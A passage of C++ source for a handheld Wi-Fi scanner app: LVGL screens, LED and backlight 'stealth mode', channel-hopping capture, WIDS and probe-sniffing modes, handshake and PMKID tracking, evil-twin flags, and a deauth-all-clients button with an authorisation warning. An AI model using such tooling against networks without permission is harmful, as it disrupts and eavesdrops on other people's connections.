    if (device_get_first_by_type(&DISPLAY_TYPE, &display) != ERROR_NONE || display == nullptr) {
        return nullptr;
    }
    if (device_get_driver(display)->api == nullptr) {
        device_put(display);
        return nullptr;
    }
    Device* backlight = nullptr;
    display_get_backlight(display, &backlight);
    device_put(display);
    return backlight;
}

void updateLeds(Context* ctx);

void setStealthMode(Context* ctx, bool enabled) {
    g_stealth_mode = enabled;
    auto* bl = getDisplayBacklight();
    if (bl != nullptr) {
        if (g_stealth_mode) {
            uint8_t current = 200;
            if (backlight_get_brightness(bl, &current) == ERROR_NONE && current > 15) {
                g_saved_backlight_duty = current;
            }
            backlight_set_brightness(bl, 15);
        } else {
            backlight_set_brightness(bl, g_saved_backlight_duty);
        }
    }

    namespace np = service::neopixel;
    if (g_stealth_mode) {
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
        np::setActiveAnimation(np::Animation::Off);
        ctx->ledViewApplied = -1;
    } else {
        ctx->ledViewApplied = -1;
        updateLeds(ctx);
    }

    lvgl_lock();
    if (ctx->statusLabel != nullptr) {
        if (g_stealth_mode) {
            lv_label_set_text(ctx->statusLabel, "STEALTH MODE ON");
        } else {
            lv_label_set_text(ctx->statusLabel, "STEALTH MODE OFF");
        }
    }
    if (ctx->homeStealthBadge != nullptr) {
        if (g_stealth_mode) {
            lv_label_set_text(ctx->homeStealthBadge, "STEALTH: ON");
            lv_obj_set_style_text_color(ctx->homeStealthBadge, lv_color_hex(0x00FF88), 0);
        } else {
            lv_label_set_text(ctx->homeStealthBadge, "STEALTH: OFF");
            lv_obj_set_style_text_color(ctx->homeStealthBadge, lv_color_hex(0x00E5FF), 0);
        }
    }
    lvgl_unlock();
}

inline void setTacticalMode(Context* ctx, bool enabled) {
    setStealthMode(ctx, enabled);
}

struct ActiveLedMode {
    uint8_t r, g, b;
    int id;
};

static uint32_t s_lastLedCycleTick = 0;
static size_t s_ledCycleIndex = 0;

void updateMultiModeLeds(Context* ctx) {
    if (g_stealth_mode) {
        namespace np = service::neopixel;
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
        np::setActiveAnimation(np::Animation::Off);
        return;
    }

    if (ctx->vuFeeding.load()) return;

    namespace np = service::neopixel;

    // Collect active modes
    std::vector<ActiveLedMode> activeList;
    if (ctx->hopActive) {
        activeList.push_back({220, 38, 38, 1}); // Tactical Red
    }
    if (ctx->widsActive) {
        activeList.push_back({0, 180, 180, 2}); // Sentinel Teal
    }
    if (ctx->reconActive) {
        activeList.push_back({168, 85, 247, 3}); // Recon Violet
    }

    if (activeList.empty()) {
        if (ctx->ledViewApplied != 2) {
            restoreLedConfig(ctx);
            ctx->ledViewApplied = 2;
            ctx->ledColorApplied = -1;
        }
        return;
    }

    if (activeList.size() == 1) {
        const auto& col = activeList[0];
        if (ctx->ledViewApplied != (10 + col.id) || ctx->ledColorApplied != col.id) {
            np::setActiveColorMode(np::ColorMode::Static);
            np::setActiveColor(col.r, col.g, col.b);
            np::setActiveSpeed(2);
            np::setActiveAnimation(np::Animation::Scanner);
            ctx->ledViewApplied = 10 + col.id;
            ctx->ledColorApplied = col.id;
        }
        return;
    }

    // 2 or 3 active modes: cycle every 1200ms
    uint32_t now = (uint32_t)lv_tick_get();
    if (now - s_lastLedCycleTick >= 1200 || ctx->ledViewApplied != 20) {
        s_lastLedCycleTick = now;
        s_ledCycleIndex = (s_ledCycleIndex + 1) % activeList.size();
        const auto& col = activeList[s_ledCycleIndex];
        np::setActiveColorMode(np::ColorMode::Static);
        np::setActiveColor(col.r, col.g, col.b);
        np::setActiveSpeed(2);
        np::setActiveAnimation(np::Animation::Scanner);
        ctx->ledViewApplied = 20;
        ctx->ledColorApplied = col.id;
    }
}

void updateLeds(Context* ctx) {
    if (g_stealth_mode) {
        namespace np = service::neopixel;
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
        np::setActiveAnimation(np::Animation::Off);
        return;
    }
    namespace np = service::neopixel;
    Page page;
    uint64_t selectedKey;
    if (ctx->mutex.lock(0)) {
        page = ctx->page;
        selectedKey = ctx->selectedKey;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (page == Page::Detail || page == Page::Clients || page == Page::EvilTwinDetail) {
        int colorIdx = 0;
        int8_t rssi = SIGNAL_FLOOR_DBM;
        bool found = false;
        if (ctx->mutex.lock(0)) {
            auto it = ctx->seen.find(selectedKey);
            if (it != ctx->seen.end()) {
                colorIdx = it->second.colorIndex % MAX_SERIES;
                rssi = it->second.record.rssi;
                found = true;
            }
            ctx->mutex.unlock();
        }
        if (!found) return;

        if (ctx->ledViewApplied != 3) {
            np::setVuPalette(np::VuPalette::Solid);
            np::setVuOrigin(np::VuOrigin::BothLeft);
            np::setVuDecayEnabled(true);
            np::setVuAutoGainEnabled(false);
            np::setVuBeatFlashEnabled(false);
            np::setVuPeakHoldEnabled(true);
            np::setVuPeakBrightness(90);
            np::setVuSensitivity(100);
            np::setVuBrightness(ctx->savedBrightness != 0 ? ctx->savedBrightness : 70);
            np::setVuActive(true);
            ctx->vuFeeding.store(true);
            ctx->ledViewApplied = 3;
            ctx->ledColorApplied = -1;
        }
        if (ctx->ledColorApplied != colorIdx) {
            uint32_t color = SERIES_COLORS[colorIdx];
            np::setVuColor((color >> 16) & 0xFF, (color >> 8) & 0xFF, color & 0xFF);
            ctx->ledColorApplied = colorIdx;
        }
        int32_t peak = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 0, SIGNAL_RANGE_DB);
        ctx->vuLevel.store((int)(peak * 255 / SIGNAL_RANGE_DB));
        ctx->vuRefreshTick.store((uint32_t)lv_tick_get());
        return;
    }

    if (ctx->ledViewApplied == 3) {
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
    }

    updateMultiModeLeds(ctx);
}

void showPage(Context* ctx, Page page);
void updateViews(Context* ctx);
void updateEvilTwinDetailPage(Context* ctx);
void updateWidsDetailPage(Context* ctx);
void updateModuleHomePage(Context* ctx);
void updateSmartStatusBar(Context* ctx);
void updateReconPage(Context* ctx);
void updateWidsGraph(Context* ctx, const std::vector<SeenAp>& aps);
void createWidsGraphPage(Context* ctx, lv_obj_t* parent);

void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
    if (ctx->chart == nullptr) return;

    lv_obj_clean(ctx->labelLayer);
    int chartWidth = lv_obj_get_width(ctx->chart);
    int chartHeight = lv_obj_get_height(ctx->chart);

    int drawn = 0;
    for (const auto& ap : aps) {
        if (drawn >= MAX_SERIES) break;
        if (ap.record.channel < 1 || ap.record.channel > 13) continue;

        uint32_t color = SERIES_COLORS[ap.colorIndex % MAX_SERIES];
        lv_chart_set_series_color(ctx->chart, ctx->series[drawn], lv_color_hex(color));
        fillBell(ctx->chart, ctx->series[drawn], ap.record.channel, ap.record.rssi);
        lv_chart_hide_series(ctx->chart, ctx->series[drawn], false);

        auto* label = lv_label_create(ctx->labelLayer);
        lv_label_set_text(label, displaySsid(ap.record));
        lv_obj_set_style_text_color(label, lv_color_hex(color), 0);
        lv_obj_update_layout(label);
        int width = lv_obj_get_width(label);
        int height = lv_obj_get_height(label);

        int xPx = (int)(chartWidth * channelFraction(ap.record.channel)) - width / 2;
        if (xPx < 0) xPx = 0;
        if (xPx + width > chartWidth) xPx = chartWidth - width;

        int32_t peak = std::clamp<int32_t>(ap.record.rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
        int yPx = chartHeight - (chartHeight * peak / SIGNAL_RANGE_DB);
        yPx -= height;
        if (yPx < 0) yPx = 0;
        if (yPx + height > chartHeight) yPx = chartHeight - height;

        lv_obj_set_pos(label, xPx, yPx);
        drawn++;
    }
    for (int i = drawn; i < MAX_SERIES; i++) {
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }

    if (ctx->activeChannelIndicator != nullptr) {
        if (ctx->hopActive) {
            int lock = getCaptureLockChannel();
            int ch = (lock >= 1 && lock <= 13) ? lock : getCurrentRadioChannel();
            if (ch >= 1 && ch <= 13 && chartWidth > 0) {
                lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
                int xPx = (int)(chartWidth * channelFraction(ch)) - 7;
                if (xPx < 0) xPx = 0;
                if (xPx + 14 > chartWidth) xPx = chartWidth - 14;
                lv_obj_set_pos(ctx->activeChannelIndicator, xPx, 0);
                uint32_t col = 0xEF4444; // Tactical: sempre rosso!
                lv_obj_set_style_bg_color(ctx->activeChannelIndicator, lv_color_hex(col), 0);
                lv_obj_set_style_border_color(ctx->activeChannelIndicator, lv_color_hex(col), 0);
            } else {
                lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
            }
        } else {
            lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
        }
    }
}

void onSelectFromList(lv_event_t* event);

void onShowList(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::List);
}

void onShowWidsDetail(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::WidsDetail);
}

ModeBadgeGroup createModeBadges(lv_obj_t* parent) {
    ModeBadgeGroup grp;
    grp.col = lv_obj_create(parent);
    lv_obj_set_width(grp.col, 40);
    lv_obj_set_flex_flow(grp.col, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(grp.col, 0, 0);
    lv_obj_set_style_pad_row(grp.col, 2, 0);
    lv_obj_set_style_border_width(grp.col, 0, 0);
    lv_obj_set_style_bg_opa(grp.col, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(grp.col, LV_OBJ_FLAG_SCROLLABLE);

    // WIDS badge (Teal)
    grp.widsBadge = lv_obj_create(grp.col);
    lv_obj_set_size(grp.widsBadge, 40, 14);
    lv_obj_set_style_pad_all(grp.widsBadge, 0, 0);
    lv_obj_set_style_radius(grp.widsBadge, 3, 0);
    lv_obj_set_style_border_width(grp.widsBadge, 0, 0);
    lv_obj_set_style_bg_color(grp.widsBadge, lv_color_hex(0x0D9488), 0);
    lv_obj_remove_flag(grp.widsBadge, LV_OBJ_FLAG_SCROLLABLE);
    auto* wLbl = lv_label_create(grp.widsBadge);
    lv_label_set_text(wLbl, "WIDS");
    lv_obj_set_style_text_font(wLbl, &lv_font_montserrat_10, 0);
    lv_obj_set_style_text_color(wLbl, lv_color_white(), 0);
    lv_obj_center(wLbl);

    // HOP badge (Red)
    grp.hopBadge = lv_obj_create(grp.col);
    lv_obj_set_size(grp.hopBadge, 40, 14);
    lv_obj_set_style_pad_all(grp.hopBadge, 0, 0);
    lv_obj_set_style_radius(grp.hopBadge, 3, 0);
    lv_obj_set_style_border_width(grp.hopBadge, 0, 0);
    lv_obj_set_style_bg_color(grp.hopBadge, lv_color_hex(0xDC2626), 0);
    lv_obj_remove_flag(grp.hopBadge, LV_OBJ_FLAG_SCROLLABLE);
    grp.hopLabel = lv_label_create(grp.hopBadge);
    lv_label_set_text(grp.hopLabel, "HOP");
    lv_obj_set_style_text_font(grp.hopLabel, &lv_font_montserrat_10, 0);
    lv_obj_set_style_text_color(grp.hopLabel, lv_color_white(), 0);
    lv_obj_center(grp.hopLabel);

    // RCN badge (Violet)
    grp.rcnBadge = lv_obj_create(grp.col);
    lv_obj_set_size(grp.rcnBadge, 40, 14);
    lv_obj_set_style_pad_all(grp.rcnBadge, 0, 0);
    lv_obj_set_style_radius(grp.rcnBadge, 3, 0);
    lv_obj_set_style_border_width(grp.rcnBadge, 0, 0);
    lv_obj_set_style_bg_color(grp.rcnBadge, lv_color_hex(0x7E22CE), 0);
    lv_obj_remove_flag(grp.rcnBadge, LV_OBJ_FLAG_SCROLLABLE);
    auto* rLbl = lv_label_create(grp.rcnBadge);
    lv_label_set_text(rLbl, "RCN");
    lv_obj_set_style_text_font(rLbl, &lv_font_montserrat_10, 0);
    lv_obj_set_style_text_color(rLbl, lv_color_white(), 0);
    lv_obj_center(rLbl);

    // STOP badge (Gray)
    grp.stopBadge = lv_obj_create(grp.col);
    lv_obj_set_size(grp.stopBadge, 40, 14);
    lv_obj_set_style_pad_all(grp.stopBadge, 0, 0);
    lv_obj_set_style_radius(grp.stopBadge, 3, 0);
    lv_obj_set_style_border_width(grp.stopBadge, 0, 0);
    lv_obj_set_style_bg_color(grp.stopBadge, lv_color_hex(0x282828), 0);
    lv_obj_remove_flag(grp.stopBadge, LV_OBJ_FLAG_SCROLLABLE);
    auto* sLbl = lv_label_create(grp.stopBadge);
    lv_label_set_text(sLbl, "STOP");
    lv_obj_set_style_text_font(sLbl, &lv_font_montserrat_10, 0);
    lv_obj_set_style_text_color(sLbl, lv_color_hex(0x888888), 0);
    lv_obj_center(sLbl);

    return grp;
}

void updateModeBadgeGroup(const ModeBadgeGroup& grp, bool widsActive, bool hopActive, bool reconActive, int lockCh) {
    if (grp.col == nullptr) return;
    if (widsActive) {
        lv_obj_remove_flag(grp.widsBadge, LV_OBJ_FLAG_HIDDEN);
    } else {
        lv_obj_add_flag(grp.widsBadge, LV_OBJ_FLAG_HIDDEN);
    }
    if (hopActive) {
        lv_obj_remove_flag(grp.hopBadge, LV_OBJ_FLAG_HIDDEN);
        if (lockCh >= 1 && lockCh <= 13) {
            char buf[12];
            snprintf(buf, sizeof(buf), "LK %d", lockCh);
            lv_label_set_text(grp.hopLabel, buf);
        } else {
            lv_label_set_text(grp.hopLabel, "HOP");
        }
    } else {
        lv_obj_add_flag(grp.hopBadge, LV_OBJ_FLAG_HIDDEN);
    }
    if (reconActive) {
        if (grp.rcnBadge != nullptr) lv_obj_remove_flag(grp.rcnBadge, LV_OBJ_FLAG_HIDDEN);
    } else {
        if (grp.rcnBadge != nullptr) lv_obj_add_flag(grp.rcnBadge, LV_OBJ_FLAG_HIDDEN);
    }
    if (!widsActive && !hopActive && !reconActive) {
        lv_obj_remove_flag(grp.stopBadge, LV_OBJ_FLAG_HIDDEN);
    } else {
        lv_obj_add_flag(grp.stopBadge, LV_OBJ_FLAG_HIDDEN);
    }
}

void refreshModeButtons(Context* ctx) {
    int lock = getCaptureLockChannel();
    updateModeBadgeGroup(ctx->tacticalModeBadges, ctx->widsActive, ctx->hopActive, ctx->reconActive, lock);
    updateModeBadgeGroup(ctx->widsModeBadges, ctx->widsActive, ctx->hopActive, ctx->reconActive, lock);

    if (ctx->captureButton != nullptr) {
        lv_obj_remove_state(ctx->captureButton, LV_STATE_DISABLED);
        if (ctx->hopActive) {
            lv_obj_set_style_bg_color(ctx->captureButton, lv_color_hex(0xDC2626), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(ctx->captureButton, lv_color_hex(0xEF4444), LV_STATE_FOCUSED);
            lv_obj_set_style_border_color(ctx->captureButton, lv_color_hex(0xF87171), LV_STATE_DEFAULT);
            lv_obj_set_style_border_width(ctx->captureButton, 2, LV_STATE_DEFAULT);
        } else {
            lv_obj_remove_local_style_prop(ctx->captureButton, LV_STYLE_BG_COLOR, LV_STATE_DEFAULT);
            lv_obj_remove_local_style_prop(ctx->captureButton, LV_STYLE_BG_COLOR, LV_STATE_FOCUSED);
            lv_obj_set_style_border_color(ctx->captureButton, lv_color_hex(0x555555), LV_STATE_DEFAULT);
            lv_obj_set_style_border_width(ctx->captureButton, 1, LV_STATE_DEFAULT);
        }
    }
    if (ctx->stopButton != nullptr) {
        if (!ctx->hopActive) {
            lv_obj_add_state(ctx->stopButton, LV_STATE_DISABLED);
        } else {
            lv_obj_remove_state(ctx->stopButton, LV_STATE_DISABLED);
        }
    }

    if (ctx->widsStartButton != nullptr) {
        lv_obj_remove_state(ctx->widsStartButton, LV_STATE_DISABLED);
        if (ctx->widsActive) {
            lv_obj_set_style_bg_color(ctx->widsStartButton, lv_color_hex(0x0D9488), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(ctx->widsStartButton, lv_color_hex(0x14B8A6), LV_STATE_FOCUSED);
            lv_obj_set_style_border_color(ctx->widsStartButton, lv_color_hex(0x2DD4BF), LV_STATE_DEFAULT);
            lv_obj_set_style_border_width(ctx->widsStartButton, 2, LV_STATE_DEFAULT);
        } else {
            lv_obj_remove_local_style_prop(ctx->widsStartButton, LV_STYLE_BG_COLOR, LV_STATE_DEFAULT);
            lv_obj_remove_local_style_prop(ctx->widsStartButton, LV_STYLE_BG_COLOR, LV_STATE_FOCUSED);
            lv_obj_set_style_border_color(ctx->widsStartButton, lv_color_hex(0x555555), LV_STATE_DEFAULT);
            lv_obj_set_style_border_width(ctx->widsStartButton, 1, LV_STATE_DEFAULT);
        }
    }
    if (ctx->widsStopButton != nullptr) {
        if (!ctx->widsActive) {
            lv_obj_add_state(ctx->widsStopButton, LV_STATE_DISABLED);
        } else {
            lv_obj_remove_state(ctx->widsStopButton, LV_STATE_DISABLED);
        }
    }

    if (ctx->reconToggleButton != nullptr) {
        auto* btnLbl = lv_obj_get_child(ctx->reconToggleButton, 0);
        if (ctx->reconActive) {
            if (btnLbl) lv_label_set_text(btnLbl, LV_SYMBOL_PAUSE " SNIFF: ON");
            lv_obj_set_style_border_color(ctx->reconToggleButton, lv_color_hex(0xA855F7), 0);
            lv_obj_set_style_bg_color(ctx->reconToggleButton, lv_color_hex(0x2E1065), 0);
            lv_obj_set_style_border_width(ctx->reconToggleButton, 2, 0);
        } else {
            if (btnLbl) lv_label_set_text(btnLbl, LV_SYMBOL_PLAY " SNIFF: OFF");
            lv_obj_set_style_border_color(ctx->reconToggleButton, lv_color_hex(0x555555), 0);
            lv_obj_set_style_bg_color(ctx->reconToggleButton, lv_color_hex(0x181818), 0);
            lv_obj_set_style_border_width(ctx->reconToggleButton, 1, 0);
        }
    }
}

void setMode(Context* ctx, RadioMode mode) {
    RadioMode previous;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        previous = ctx->mode;
        ctx->mode = mode;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (previous == RadioMode::Capture && mode != RadioMode::Capture) stopCapture(ctx);
    if (mode == RadioMode::Capture) startCapture(ctx);
    refreshModeButtons(ctx);
    updateLeds(ctx);
}

// Unified Start/Stop Toggle for Tactical (Hopping)
void onHopToggleClick(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    ctx->hopActive = !ctx->hopActive;
    if (ctx->hopActive) {
        startRadioIfNeeded(ctx);
    } else {
        stopRadioIfNeither(ctx);
    }
    refreshModeButtons(ctx);
    updateViews(ctx);
    updateLeds(ctx);
}

// Unified Start/Stop Toggle for Sentinel (WIDS)
void onWidsToggleClick(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    ctx->widsActive = !ctx->widsActive;
    if (ctx->widsActive) {
        setCaptureLockChannel(0);
        startRadioIfNeeded(ctx);
    } else {
        stopRadioIfNeither(ctx);
    }
    refreshModeButtons(ctx);
    updateViews(ctx);
    updateLeds(ctx);
}

// Unified Start/Stop Toggle for Recon (Probe Hunter)
void onReconToggleClick(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    ctx->reconActive = !ctx->reconActive;
    if (ctx->reconActive) {
        startRadioIfNeeded(ctx);
    } else {
        stopRadioIfNeither(ctx);
    }
    refreshModeButtons(ctx);
    updateViews(ctx);
    updateLeds(ctx);
    updateReconPage(ctx);
}

[[maybe_unused]] void onHopButtonClick(lv_event_t* event) { onHopToggleClick(event); }
[[maybe_unused]] void onHopStopClick(lv_event_t* event) { onHopToggleClick(event); }
[[maybe_unused]] void onWidsButtonClick(lv_event_t* event) { onWidsToggleClick(event); }
[[maybe_unused]] void onWidsStopClick(lv_event_t* event) { onWidsToggleClick(event); }
[[maybe_unused]] void onStartScan(lv_event_t* event) { onWidsToggleClick(event); }
[[maybe_unused]] void onStartCapture(lv_event_t* event) { onHopToggleClick(event); }
[[maybe_unused]] void onStop(lv_event_t* event) { onHopToggleClick(event); }

void updateDetail(Context* ctx);

static void onMediaKey(uint32_t key, bool is_long_press) {
    if (g_active_scanner_ctx == nullptr) return;
    auto* ctx = g_active_scanner_ctx;

    if (key == 0x20003 || (key == 0x20000 && is_long_press)) {
        // Toggle Stealth Mode (Long-press Play)
        setStealthMode(ctx, !g_stealth_mode);
        return;
    }

    if (key == 0x20000) {
        // Short-press Play: cycle ActiveScan -> Capture -> Stopped -> ActiveScan
        RadioMode cur = RadioMode::Stopped;
        if (ctx->mutex.lock(100 / portTICK_PERIOD_MS)) {
            cur = ctx->mode;
            ctx->mutex.unlock();
        }
        RadioMode next;
        if (cur == RadioMode::ActiveScan) next = RadioMode::Capture;
        else if (cur == RadioMode::Capture) next = RadioMode::Stopped;
        else next = RadioMode::ActiveScan;
        setMode(ctx, next);
        return;
    }

    if (key == 0x20001) {
        // Prev (<< / CH-)
        if (is_long_press) {
            // Long press: sblocca canale e torna a monitorare tutti i canali (hopping 1-13)
            setCaptureLockChannel(0);
        } else {
            // Short press: lock canale e sposta indietro (13..1) per fare sentinel
            int ch = getCaptureLockChannel();
            if (ch <= 0) {
                ch = 13;
            } else {
                ch--;
                if (ch < 1) ch = 13;
            }
            if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
            setCaptureLockChannel(ch);
        }
        updateLeds(ctx);
        if (ctx->page == Page::Detail) updateDetail(ctx);
        if (ctx->page == Page::WidsDetail) updateWidsDetailPage(ctx);
        updateViews(ctx);
        refreshModeButtons(ctx);
        return;
    }

    if (key == 0x20002) {
        // Next (>> / CH+)
        if (is_long_press) {
            // Long press: sblocca canale e torna a monitorare tutti i canali (hopping 1-13)
            setCaptureLockChannel(0);
        } else {
            // Short press: lock canale e sposta avanti (1..13) per fare sentinel
            int ch = getCaptureLockChannel();
            if (ch <= 0) {
                ch = 1;
            } else {
                ch++;
                if (ch > 13) ch = 1;
            }
            if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
            setCaptureLockChannel(ch);
        }
        updateLeds(ctx);
        if (ctx->page == Page::Detail) updateDetail(ctx);
        if (ctx->page == Page::WidsDetail) updateWidsDetailPage(ctx);
        updateViews(ctx);
        refreshModeButtons(ctx);
        return;
    }
}

void onToggleLock(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    int channel = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        channel = ctx->detailChannel;
        ctx->mutex.unlock();
    }
    if (channel < 1 || channel > 13) return;

    bool nowLocked = getCaptureLockChannel() != channel;
    if (nowLocked) {
        if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
        setCaptureLockChannel(channel);
    } else {
        setCaptureLockChannel(0);
    }
    updateDetail(ctx);
    updateLeds(ctx);
}

void onDeauthPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    char ssid[33] = {};
    bool found = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            found = true;
        }
        ctx->mutex.unlock();
    }
    if (!found) return;

    char message[160];
    snprintf(message, sizeof(message),
        "Invia deauth a TUTTI i client di \"%s\"?\nSolo su reti/dispositivi tuoi o autorizzati.",
        ssid[0] != '\0' ? ssid : "(nascosta)");
    ctx->deauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth", message, { "Invia", "Annulla" });
}

void onShowClients(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::Clients);
}

void onShowEvilTwinDetail(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::EvilTwinDetail);
}

void onSelectFromList(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    lv_obj_t* row = lv_event_get_current_target_obj(event);
    uint64_t key = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, w] : ctx->rows) {
            if (w == row) { key = k; break; }
        }
        ctx->selectedKey = key;
        auto it = ctx->seen.find(key);
        ctx->detailBeaconBaseline = it != ctx->seen.end() ? it->second.packetCount : 0;
        ctx->detailChannel = it != ctx->seen.end() ? (int)it->second.record.channel : 0;
        ctx->mutex.unlock();
    }
    if (key != 0) showPage(ctx, Page::Detail);
}

constexpr int LIST_ROW_HEIGHT = 30;
constexpr int COL_CH = 34;
constexpr int COL_POWER = 56;
constexpr int COL_SEC = 56;
constexpr int COL_CLI = 30;

lv_obj_t* addFieldLabel(lv_obj_t* row, int width) {
    auto* label = lv_label_create(row);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_long_mode(label, LV_LABEL_LONG_MODE_CLIP);
    return label;
}

void addLegendLabel(lv_obj_t* header, const char* text, int width) {
    auto* label = lv_label_create(header);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_text(label, text);
}

void applyFocusStyle(lv_obj_t* obj) {
    if (obj == nullptr) return;
    const lv_color_t neon = lv_color_hex(0x00FF88);
    for (lv_state_t st : { LV_STATE_FOCUSED, LV_STATE_FOCUS_KEY }) {
        lv_obj_set_style_outline_width(obj, 0, st);
        lv_obj_set_style_border_width(obj, 0, st);
        lv_obj_set_style_bg_color(obj, neon, st);
        lv_obj_set_style_bg_opa(obj, LV_OPA_30, st);
    }
}

lv_obj_t* createListRow(Context* ctx, uint64_t key) {
    auto* row = lv_list_add_button(ctx->list, nullptr, "");
    lv_obj_clean(row);
    applyFocusStyle(row);
    lv_obj_set_height(row, LIST_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);
    (void)key;
    lv_obj_add_event_cb(row, onSelectFromList, LV_EVENT_CLICKED, ctx);

    auto* chip = lv_obj_create(row);
    lv_obj_set_size(chip, 6, LV_PCT(90));
    lv_obj_set_style_radius(chip, 2, 0);
    lv_obj_set_style_border_width(chip, 0, 0);
    lv_obj_set_style_pad_all(chip, 0, 0);
    lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);

    auto* name = lv_label_create(row);
    lv_label_set_long_mode(name, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(name, 1);

    addFieldLabel(row, COL_CH);
    addFieldLabel(row, COL_POWER);
    addFieldLabel(row, COL_SEC);
    addFieldLabel(row, COL_CLI);

    return row;
}

void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uint64_t, int>& clientCounts, const std::map<uint64_t, uint32_t>& dataTotals) {
    if (ctx->list == nullptr) return;

    std::vector<uint64_t> keys;
    for (const auto& ap : aps) keys.push_back(bssidKey(ap.record.bssid));

    for (auto it = ctx->rows.begin(); it != ctx->rows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->rows.erase(it);
        } else {
            ++it;
        }
    }

    for (const auto& ap : aps) {
        uint64_t key = bssidKey(ap.record.bssid);
        lv_obj_t* row = nullptr;
        auto it = ctx->rows.find(key);
        if (it == ctx->rows.end()) {
            row = createListRow(ctx, key);
            ctx->rows[key] = row;
        } else {
            row = it->second;
        }

        auto* chip = lv_obj_get_child(row, 0);
        lv_obj_set_style_bg_color(chip, lv_color_hex(SERIES_COLORS[ap.colorIndex % MAX_SERIES]), 0);
        lv_obj_set_style_bg_opa(chip, LV_OPA_COVER, 0);

        char ssidLine[48];
        snprintf(ssidLine, sizeof(ssidLine), "%s%s", displaySsid(ap.record), ap.fromCapture ? " *" : "");
        lv_label_set_text(lv_obj_get_child(row, 1), ssidLine);

        char channelText[16];
        char dataText[16];
        snprintf(channelText, sizeof(channelText), "%d", (int)ap.record.channel);
        
        auto dataIt = dataTotals.find(key);
        uint32_t totalDataFrames = dataIt != dataTotals.end() ? dataIt->second : 0;
        snprintf(dataText, sizeof(dataText), "%u", (unsigned)totalDataFrames);

        lv_label_set_text(lv_obj_get_child(row, 2), channelText);
        lv_label_set_text(lv_obj_get_child(row, 3), dataText);
        lv_label_set_text(lv_obj_get_child(row, 4), authToString(ap.record.authentication_type));

        auto countIt = clientCounts.find(key);
        int count = countIt != clientCounts.end() ? countIt->second : 0;
        char cliText[12] = "";
        if (count > 0) snprintf(cliText, sizeof(cliText), "%d", count);
        lv_label_set_text(lv_obj_get_child(row, 5), cliText);
    }
}

void onConnectPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    std::string ssid;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) ssid = it->second.record.ssid;
        ctx->mutex.unlock();
    }
    if (!ssid.empty()) connectTo(ctx, ssid);
}

void updateDetail(Context* ctx) {
    if (ctx->detailSsidLabel == nullptr) return;

    SeenAp ap{};
    bool found = false;
    uint32_t beaconBaseline = 0;
    int clientCount = 0;
    bool hsPresent = false, hsHas[4] = {}, hsPmkid = false, hsSaved = false;
    int deauthBursts = 0;
    bool evilTwin = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            ap = it->second;
            found = true;
            beaconBaseline = ctx->detailBeaconBaseline;
            for (const auto& [clientKey, client] : ctx->clients) {
                if (client.associatedBssid == ctx->selectedKey) clientCount++;
            }
            auto hit = ctx->handshakes.find(ctx->selectedKey);
